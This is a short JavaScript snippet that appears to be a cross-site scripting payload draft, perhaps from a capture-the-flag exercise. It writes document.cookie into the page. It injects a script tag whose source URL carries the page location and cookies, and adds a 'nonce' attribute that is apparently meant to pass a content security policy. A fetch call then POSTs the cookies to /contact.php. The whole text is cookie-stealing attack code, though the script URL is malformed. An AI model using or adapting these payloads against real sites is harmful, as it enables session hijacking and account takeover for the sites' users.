document.write(document.cookie);
document.write('<script SRC = "coucou'+'location='+document.location+'&cookie='+document.cookie+'" nonce></script>');

fetch('/contact.php', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    contenu: document.cookie
  })
})


